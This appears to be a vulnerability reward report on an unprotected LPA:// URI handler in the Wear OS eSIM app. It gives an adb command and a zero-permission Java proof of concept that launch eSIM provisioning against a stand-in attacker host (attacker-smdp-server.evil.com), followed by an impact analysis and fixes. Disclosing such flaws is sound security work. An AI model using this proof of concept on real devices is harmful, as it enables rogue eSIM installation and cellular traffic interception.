# VRP Report #45: eSIM Wear — Unprotected LPA:// URI Handler Enables Rogue Profile Provisioning

## Summary

The Wear OS eSIM management app (`com.google.android.euicc.wear`) exports `QrDownloadActivity` with an intent filter for the `LPA://` URI scheme and **no permission protection**. Any zero-permission app can send an `ACTION_VIEW` intent with an LPA activation code pointing to an **attacker-controlled SM-DP+ server**, triggering the eSIM profile download flow. The user sees a provisioning UI but the server address is entirely attacker-controlled.

## Affected Component

| Component | Value |
|---|---|
| Package | `com.google.android.euicc.wear` |
| Activity | `com.android.euicc.ui.activation.QrDownloadActivity` |
| Exported | `true` |
| Permission | **NONE** |
| URI Scheme | `LPA://` |

## Root Cause

### Manifest — Exported with No Permission

```xml
<activity android:exported="true" 
    android:name="com.android.euicc.ui.activation.QrDownloadActivity">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <data android:scheme="LPA"/>
    </intent-filter>
</activity>
```

### Code — Blindly Forwards Attacker-Controlled URI

`QrDownloadActivity.java` lines 130-143:
```java
if (intent.getAction().equals("android.intent.action.VIEW")) {
    Intent intent2 = new Intent(this, CurrentSuwInitActivity.class);
    intent2.putExtra("download_flow_from_other_apps", true);
    intent2.putExtra("activation_code", intent.getDataString());
    // ^ Passes the entire LPA URI including attacker's SM-DP+ server address
    startActivity(intent2);
}
```

The LPA URI format is: `LPA:1$<SM-DP+ server>$<activation code>`
The attacker controls BOTH the server address and activation code.

## Proof of Concept

### Dynamic Confirmation (Pixel Watch 2)
```bash
adb shell am start -a android.intent.action.VIEW \
    -d "LPA:1\$attacker-smdp-server.evil.com\$MALICIOUS_CODE" \
    com.google.android.euicc.wear/com.android.euicc.ui.activation.QrDownloadActivity

# Result: Starting: Intent { act=android.intent.action.VIEW 
#   dat=LPA:1$attacker-smdp-server.evil.com$MALICIOUS_CODE 
#   cmp=com.google.android.euicc.wear/com.android.euicc.ui.activation.QrDownloadActivity }
# Activity launched — navigates to eSIM download flow with attacker server
```

### Zero-Permission PoC App
```java
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setData(Uri.parse("LPA:1$attacker-smdp-server.evil.com$MALICIOUS_CODE"));
intent.setClassName("com.google.android.euicc.wear",
    "com.android.euicc.ui.activation.QrDownloadActivity");
startActivity(intent);
// eSIM provisioning UI appears with attacker-controlled server
```

## Impact

### 1. Rogue eSIM Profile Installation (Integrity — HIGH)
- The attacker can point the device to a malicious SM-DP+ server
- If the user confirms the download (UI shows on the watch's small screen), a rogue eSIM profile is installed
- A rogue profile could redirect cellular traffic through attacker-controlled infrastructure

### 2. Social Engineering on Small Screen (User Interaction — LOW)
- The watch's 384x384 screen makes it difficult to inspect the server address
- The provisioning UI may not prominently display the SM-DP+ server address
- User may tap "confirm" without realizing the profile comes from an attacker

### 3. Network Interception
- A successfully installed rogue eSIM profile could route traffic through attacker's cellular infrastructure
- Enables man-in-the-middle attacks on cellular data

## Severity Assessment

| Factor | Assessment |
|---|---|
| Attack Vector | Local (installed app) |
| Attack Complexity | LOW |
| Privileges Required | NONE (zero permissions) |
| User Interaction | REQUIRED (must confirm provisioning) |
| Confidentiality | HIGH (if rogue profile intercepts traffic) |
| Integrity | HIGH (unauthorized eSIM installation) |
| Availability | MEDIUM (can disrupt cellular connectivity) |

## Recommended Fix

1. **Add permission to the activity** — restrict to system or carrier apps
2. **Validate SM-DP+ server** against a known-good allowlist before proceeding
3. **Show clear warning** displaying the server address before provisioning

## Device / Build
- Pixel Watch 2 (3A101RTJWRGCV9), Wear OS, Build CP2A.260603.001
- Package: `com.google.android.euicc.wear`
- Decompiled: `deep_analysis/euicc_wear_jadx/`

## Source Files
- QrDownloadActivity: `deep_analysis/euicc_wear_jadx/sources/com/android/euicc/ui/activation/QrDownloadActivity.java`
- Manifest: `deep_analysis/euicc_wear_apktool/AndroidManifest.xml`
